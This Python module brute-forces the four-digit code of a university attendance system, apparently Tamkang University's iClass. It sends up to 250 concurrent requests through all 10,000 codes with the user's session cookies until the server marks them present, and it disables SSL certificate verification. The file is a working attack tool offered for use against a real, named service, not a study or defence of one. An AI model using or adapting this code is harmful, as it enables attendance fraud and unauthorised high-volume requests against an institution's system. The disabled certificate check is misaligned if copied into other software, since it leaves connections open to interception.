import ssl
import aiohttp
import asyncio
import json
import logging
import os

from schools.http_headers import number_rollcall_headers

if not logging.getLogger().hasHandlers():
    logging.basicConfig(
        level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    )

logger = logging.getLogger(__name__)

MAX_NUMBER_CODE = 10_000
DEFAULT_CONCURRENCY = int(os.getenv("CONCURRENCY", "250"))


async def try_code(session, url, headers, code):
    data = {"deviceId": "7eba2081f77e5527", "numberCode": code}
    async with session.put(url, headers=headers, data=json.dumps(data)) as resp:
        body = await resp.read()
        logger.debug("Trying %s: %s", code, resp.status)
        if resp.status == 200 and b"on_call" in body:
            logger.info("Correct code found: %s", code)
            return code
    return None


async def answer_rollcall_number_async(
    session, rollcall_id, *, concurrency=DEFAULT_CONCURRENCY, endpoint="https://iclass.tku.edu.tw",
):
    url = f"{endpoint}/api/rollcall/{rollcall_id}/answer_number_rollcall"
    headers = number_rollcall_headers()
    headers.update({
        "host": endpoint.replace("https://", "").replace("http://", ""),
    })
    
    concurrency = max(1, min(concurrency, MAX_NUMBER_CODE))

    # Disable SSL verification
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_context)
    cookie_dict = session.cookies.get_dict()

    async with aiohttp.ClientSession(
        cookies=cookie_dict, connector=connector
    ) as async_session:
        pending = set()
        codes = (f"{i:04d}" for i in range(MAX_NUMBER_CODE))

        def schedule_next() -> bool:
            try:
                code = next(codes)
            except StopIteration:
                return False
            pending.add(
                asyncio.create_task(try_code(async_session, url, headers, code))
            )
            return True

        for _ in range(concurrency):
            if not schedule_next():
                break

        while pending:
            done, pending = await asyncio.wait(
                pending, return_when=asyncio.FIRST_COMPLETED
            )
            for finished in done:
                if finished.exception():
                    for task in pending:
                        task.cancel()
                    await asyncio.gather(*pending, return_exceptions=True)
                    raise finished.exception()
                result = finished.result()
                if result is not None:
                    for task in pending:
                        task.cancel()
                    await asyncio.gather(*pending, return_exceptions=True)
                    return result
                schedule_next()

    logger.error("Unable to find correct code after %s attempts", MAX_NUMBER_CODE)
    return None
